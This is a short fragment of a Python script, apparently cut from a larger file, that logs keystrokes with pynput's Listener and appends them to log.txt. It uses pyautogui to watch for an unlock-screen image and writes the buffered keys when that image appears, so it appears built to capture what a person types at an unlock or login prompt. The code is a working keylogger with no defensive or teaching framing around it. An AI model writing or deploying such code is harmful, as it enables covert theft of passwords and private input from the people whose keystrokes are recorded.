def on_press(key):
            global keys
            if(pyautogui.locateOnScreen('./img/unlock2.png')):
                print("Stop")
                write_file(keys)
                keys = []
            keys.append(key)
            print("{0} pressed".format(key))


        def write_file(keys):
            with open("log.txt", "a") as f:
                for key in keys:
                    k = str(key).replace("'","")
                    f.write(k)
                return
    
        def on_release(key):
            if key == Key.esc:
                return False
        
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()